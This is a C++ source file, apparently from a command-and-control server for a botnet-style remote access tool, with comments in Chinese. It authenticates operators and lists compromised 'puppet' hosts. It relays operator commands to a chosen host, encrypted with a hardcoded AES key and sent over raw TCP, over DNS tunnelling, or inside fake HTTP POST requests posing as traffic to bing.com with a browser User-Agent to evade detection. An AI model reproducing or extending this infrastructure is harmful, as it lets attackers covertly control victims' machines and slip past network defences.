//ControlManager.cpp

#include "ControlManager.h"
#include "PuppetConnectDispatcher.h"
#include "PuppetManager.h"
#include "AES.h"
#include "DNS.h"

std::string httpEncapsulation(std::string command) {
    // 计算请求体长度
    std::string contentLength = "Content-Length: " + std::to_string(command.size()) + "\r\n";

    // 构建符合HTTP/1.1标准的请求
    std::string httpStr =
        "POST / HTTP/1.1\r\n"
        "Host: bing.com\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Connection: keep-alive\r\n"
        + contentLength +
        "\r\n"; // 空行分隔头部与body

    return httpStr + command;
}

void ControlHandle(int clientID, SOCKET clientSocket, ServerManager* serverManager, ClientConnectionManager& instance) {

    char buffer[BUFFER_SIZE] = { 0 };

    //处理用户的认证信息
    while (instance.getGRunning()) {

        char authentication_buff[BUFFER_SIZE] = { 0 };

        int bytesReceived = recv(clientSocket, authentication_buff, BUFFER_SIZE, 0);

        if (bytesReceived <= 0) {

            safePrint("控制端id: ", clientID, " ip: ", instance.getClient(clientID)->getIp(), " 认证出错!!!");

            instance.getAllClient().erase(clientID);

            if (instance.getActiveClientID() == clientID) {
                instance.setActiveClientID(-1);
            }
            return;
        }

        authentication_buff[bytesReceived] = '\0';

        std::string userAndPassCode = authentication_buff;
        std::istringstream input_stream(userAndPassCode);
        std::string userName = "";
        std::string passCodeTmp = "";
        std::string passResultPass = "pass!!!";
        std::string passResultNoPass = "fail!!!";

        std::getline(input_stream, userName, ':');
        std::getline(input_stream, passCodeTmp);

        if (passCodeTmp == instance.getPassCode()) {

            if (send(clientSocket, passResultPass.c_str(), passResultPass.size(), 0) == SOCKET_ERROR) {
                std::cerr << "发送失败: " << WSAGetLastError() << std::endl;
            }

            instance.getClient(clientID)->setUserName(userName);

            break;
        }
        else
        {
            if (send(clientSocket, passResultNoPass.c_str(), passResultNoPass.size(), 0) == SOCKET_ERROR) {
                std::cerr << "发送失败: " << WSAGetLastError() << std::endl;
            }
        }
    }
    
    sendPuppetInfo(instance);//在新的控制端加入时，通知其当前服务器连接的傀儡列表

    while (instance.getGRunning()) {

        int bytesReceived = recv(clientSocket, buffer, BUFFER_SIZE, 0);

        if (bytesReceived <= 0) {

            safePrint("控制端id: ", clientID, " ip: ", instance.getClient(clientID)->getIp(), " 断开连接!");

            closesocket(clientSocket);
            //instance.getAllClient().erase(clientID);
            instance.removeClient(clientID);

            if (instance.getActiveClientID() == clientID) {
                instance.setActiveClientID(-1);
            }
            return;
        }

        buffer[bytesReceived] = '\0';

        std::string command = buffer;

        //将控制端的命令加入命令队列        
        serverManager->setCmdList(stringCombination("[",instance.getClient(clientID)->getUserName(),"]", "$", command), true);

        if (command.find("show") != std::string::npos) {

            std::string puppet_list = "puppet list:\n";

            for (const auto& sockets : instance.getAllClient())
            {
                if (!sockets.second->isControl()) {

                    puppet_list.append(stringCombination("id:", std::to_string(sockets.second->getUserId()), "ip:", sockets.second->getIp(),"\n"));
                }
            }

            serverManager->setCmdList(puppet_list, false);
        }
        else if (command.find("listenerAdd:") != std::string::npos)
        {
            //如果从控制端接收到增加监听器的命令则创建监听器线程
            puppetListenerCreate(command,serverManager,instance);
        }
        else
        {
            if (command.find("set ") != std::string::npos) {
                int newID = std::stoi(command.substr(4));
                std::map<int, std::shared_ptr<UserManager>> tmp_instance = instance.getAllClient();
                if (tmp_instance.find(newID) != tmp_instance.end()) {

                    instance.setActiveClientID(newID);

                    serverManager->setCmdList(stringCombination("current puppet id: ", std::to_string(newID)), false);
                }
                else {

                    serverManager->setCmdList(stringCombination("client id:", std::to_string(newID), "not found !!!"), false);
                }
                continue;
            }

            if (instance.getActiveClientID() == -1) {

                serverManager->setCmdList("please set the id: ", false);
                serverManager->setCmdList(command);

                continue;
            }

            std::shared_ptr<UserManager> user = instance.getAllClient()[instance.getActiveClientID()];

            if (user->getProtocol() == "dns") {

                DNSHeader header{};
                header.id = htons(1234);
                header.flags = htons(0x0100);  // 标准查询
                header.questions = htons(0x01);

                TunnelRequest request;
                TunnelResponse response;
                DNS dns(header, request, response);

                dns.sendRequest(user->getSocket(), command, user->getIp().c_str(),user->getPort());
            }
            else if(user->getProtocol() == "http")
            {

                SOCKET targetSocket = user->getSocket();

                std::string key = "weiweiSecretKey123!";

                command = Encrypt::encodeByAES(command, key);

                command = httpEncapsulation(command);//包装为http post请求

                if (send(targetSocket, command.c_str(), command.size(), 0) == SOCKET_ERROR) {

                    safePrint("发送失败: ", WSAGetLastError());
                }
            }
            else
            {
                SOCKET targetSocket = user->getSocket();

                std::string key = "weiweiSecretKey123!";

                command = Encrypt::encodeByAES(command, key);

                if (send(targetSocket, command.c_str(), command.size(), 0) == SOCKET_ERROR) {

                    safePrint("发送失败: ", WSAGetLastError());
                }
            }
        }
    }
}

// 处理控制端输入命令
void HandleClient(SOCKET listenSocket_client, ServerManager* serverManager, ClientConnectionManager& instance) {

    while (true) {

        sockaddr_in clientAddr{};
        int clientAddrSize = sizeof(clientAddr);
        SOCKET clientSocket = accept(listenSocket_client, (sockaddr*)&clientAddr, &clientAddrSize);

        if (clientSocket == INVALID_SOCKET) {

            safePrint("接受连接失败!!!", WSAGetLastError());
            continue;
        }

        char clientIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);

        {
            safePrint("\n接收到客户端连接, IP: ", clientIP, ":", ntohs(clientAddr.sin_port));
        }
        std::string protocol = "tcp";
        sockaddr_in clientSock;
        memset(&clientSock, 0, sizeof(clientSock));
        // 创建并初始化 ClientInfo 对象
        int clientID = clientAndPuppetConnectionDeal(instance, clientIP, clientSocket, clientSock, true, protocol,std::to_string(clientAddr.sin_port));

        //单独创建一个线程用于与控制端的交互
        std::thread controlThread(ControlHandle, clientID, clientSocket, serverManager, std::ref(instance));
        controlThread.detach();
    }
}